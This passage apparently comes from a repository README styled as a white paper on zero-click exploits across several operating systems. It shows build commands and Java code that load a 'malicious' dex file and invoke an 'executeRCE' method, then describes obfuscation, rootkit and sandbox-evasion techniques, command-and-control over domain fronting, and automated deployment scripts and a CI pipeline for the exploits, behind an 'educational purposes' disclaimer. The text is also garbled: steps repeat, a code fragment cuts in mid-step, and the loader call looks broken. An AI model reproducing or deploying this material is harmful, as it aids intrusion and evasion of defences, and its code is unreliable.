		```bash
		dx --dex --output=myexploit.dex myexploit.class
		```

 2. Create a new APK that includes the malicious dex file and any required dependencies:

  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <manifest xmlns:android="http://schemas.android.com/apk/res/android"
      package="com.example.androidexploit">

      <application>
          <activity android:name=".MainActivity">
              <intent-filter>
                  <action android:name="android.intent.action.MAIN" />
                  <category android:name="android.intent.category.LAUNCHER" />
              </intent-filter>
          </activity>
      </application>

  </manifest>
  ```

  3. Sign the APK with a valid signing certificate:

          setContentView(R.layout.activity_main);
  
          // Load the malicious dex file
          String[] paths = getPackageCodePath().split(" ");
          DexClassLoader cl = new DexClassLoader(paths, getPackageCodePath(), null, getClass().getClassLoader());
  
          // Invoke the RCE method from the dex file
          try {
              Method m = cl.loadClass("com.example.malicious.Malware").getDeclaredMethod("executeRCE", String.class);
              m.invoke(null, "Hello, Android!");
          } catch (Exception e) {
              e.printStackTrace();
          }
      }
  }
  ```

### How to Run

   1. Build the malicious dex file using the `dx` tool from the 		   Android SDK:

		```bash
		dx --dex --output=myexploit.dex myexploit.class
		```

**NOTES**

### This white paper has provided comprehensive information on zero-click exploits for various operating systems, including Android, iOS, Windows, Debian-based Linux distros, and macOS. The exploits are designed to demonstrate how an attacker can execute arbitrary code without user interaction or triggering a specific action on the target system. The exploit codes, explanations of how they work, and examples of custom exploits have been provided for each OS.

**DISCLAIMERS**

### Always remember that exploiting vulnerabilities without proper authorization is unlawful and can result in severe consequences. These exploits are solely for research and educational purposes.

**Legal Consequences**

### Criminal Charges 

	Exploiting vulnerabilities for unauthorized purposes can be considered a crime under various laws, such as computer fraud and abuse statutes, data protection acts, or hacking laws.

### Civil Liability

	Victims of unauthorized exploitation may seek legal recourse against attackers, which could result in inancial compensation or other penalties.

### Reputation Damage

	Exploiting vulnerabilities can damage the reputation of both the attacker and the targeted system.

**Security Risks**

### Data Breaches

	Unauthorized access to a system can lead to sensitive data being compromised, putting individuals' privacy at risk and potentially causing financial losses.

### System Downtime

	Malicious exploitation can cause system crashes or instability, leading to downtime and disruptions for the targeted organization.

### Loss of Confidentiality

	Exploiting vulnerabilities may result in the exposure of confidential information, trade secrets, or intellectual property.

### Ethical Responsibilities

	As security professionals, it is our responsibility to conduct research and testing responsibly, ensuring that we do not compromise the privacy or security of others. This includes adhering to the following principles:

#### Obtain Proper Authorization 

			Always obtain proper authorization from system owners before conducting any tests or exploiting vulnerabilities.

#### Respect Privacy

			Do not exploit vulnerabilities that would compromise the privacy of individuals or organizations.

#### Report Vulnerabilities

			Disclose vulnerabilities and exploits responsibly, providing sufficient information for the affected parties to address the issue.

#### Conduct Research Legally

			Ensure that your research is conducted within the bounds of applicable laws and regulations.

### The zero-click exploits provided in this white paper are solely for educational purposes and should not be used without proper authorization or for malicious intentions. We encourage responsible disclosure and exploitation testing, prioritizing the security and privacy of all parties involved.

### Advanced Code Logic Enhancements

The exploits in this repository have been enhanced with advanced code logic, including obfuscation techniques, stealth and evasion mechanisms, and advanced payload delivery. These enhancements make the exploits more sophisticated and harder to detect and analyze.

### Obfuscation Techniques

* Control Flow Obfuscation: The control flow of the exploit code has been obfuscated to make it less predictable and harder to analyze.
* String Encryption: Sensitive strings in the exploit code have been encrypted and are decrypted at runtime.
* Anti-Debugging Techniques: Techniques have been implemented to detect and prevent debugging attempts.

### Stealth and Evasion Mechanisms

* Process Injection: The exploit code is injected into legitimate processes to avoid detection.
* Rootkit Techniques: Rootkit techniques have been used to hide the presence of the exploit on the target system.
* Sandbox Evasion: Techniques have been implemented to detect and bypass sandbox environments.
* Timing-Based Evasion: Timing-based evasion techniques have been used to avoid detection by security software.

### Advanced Payload Delivery

* Multi-Stage Payloads: The exploit is delivered in smaller, less detectable parts.
* Reflective DLL Injection: For Windows exploits, the payload is loaded directly into memory without touching the disk.
* In-Memory Execution: The payload is executed directly from memory to avoid writing it to disk.
* Steganography: The payload is embedded within an image, audio, or video file to avoid detection.
* Polymorphic Payloads: The payload changes its code structure each time it is delivered to avoid signature-based detection.
* Domain Fronting: The communication between the exploit and the command-and-control server is disguised using domain fronting.

### Automated Deployment Scripts

Automated deployment scripts have been created for each exploit to streamline the deployment process. These scripts include steps for building, signing, and deploying the exploit, as well as obfuscation, stealth, and evasion mechanisms.

### Deployment Scripts

* `scripts/android_deploy.sh`: Automates the deployment of the Android exploit.
* `scripts/ios_deploy.sh`: Automates the deployment of the iOS exploit.
* `scripts/windows_deploy.bat`: Automates the deployment of the Windows exploit.
* `scripts/linux_deploy.sh`: Automates the deployment of the Linux exploit.
* `scripts/macos_deploy.sh`: Automates the deployment of the macOS exploit.

### CI/CD Pipeline

A CI/CD pipeline configuration has been added to automate the deployment of all exploits. The pipeline includes steps for obfuscation, stealth, and evasion mechanisms. The configuration is stored in the `.github/workflows` directory.
